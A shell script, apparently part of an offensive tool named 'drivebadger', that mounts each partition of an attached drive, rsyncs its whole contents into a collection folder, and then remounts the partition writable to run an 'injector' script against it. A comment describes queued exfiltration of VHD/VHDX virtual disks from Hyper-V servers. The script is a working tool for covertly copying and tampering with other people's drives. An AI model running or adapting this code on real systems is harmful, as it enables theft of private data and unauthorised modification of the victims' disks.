#!/bin/sh

target_root_directory=$1
target_directory=$2
keys_directory=$3
drive_serial=$4
current_partition=$5
uuid=$6
fs=$7


mountpoint=/media/$current_partition/mnt
subtarget=$target_directory/$drive_serial/${current_partition}_${fs}
mkdir -p $mountpoint $subtarget

injector=`/opt/drivebadger/internal/generic/get-injector-script.sh $fs $drive_serial $uuid`

if mount -t $fs -o ro /dev/$current_partition $mountpoint >>$subtarget/rsync.log 2>>$subtarget/rsync.err; then
	/opt/drivebadger/internal/generic/process-hooks.sh $mountpoint $target_root_directory

	logger "copying UUID=$uuid (partition $current_partition filesystem $fs, mounted as $mountpoint, target directory $subtarget)"
	/opt/drivebadger/internal/generic/rsync-partition.sh $mountpoint $subtarget >>$subtarget/rsync.log 2>>$subtarget/rsync.err
	logger "copied UUID=$uuid"

	if [ "$injector" != "" ]; then
		logger "attempting to inject UUID=$uuid (partition $current_partition filesystem $fs, mounted as $mountpoint, injector $injector)"
		if mount -t $fs -o remount,rw /dev/$current_partition $mountpoint >>$subtarget/injector.log 2>>$subtarget/injector.err; then
			$injector $mountpoint >>$subtarget/injector.log 2>>$subtarget/injector.err
			logger "injected UUID=$uuid"
		fi
	fi

	# hook-virtual uses task spooler to queue exfiltration of VHD/VHDX containers stored
	# on plain NTFS, on Hyper-V servers - if such tasks for this particular partition are
	# in progress (or still queued), do not unmount, since it would make these containers
	# inaccessible.
	#
	# if this is not Hyper-V (or any other NTFS), or no VHD/VHDX containers were found,
	# then simply unmount and forget.
	#
	if [ "`ps aux |grep \"tsp /opt/drivebadger\" |grep $mountpoint`" = "" ]; then
		umount $mountpoint
	fi
else
	logger "error mounting UUID=$uuid (partition $current_partition filesystem $fs, attempted mount as $mountpoint, target directory $subtarget)"
fi
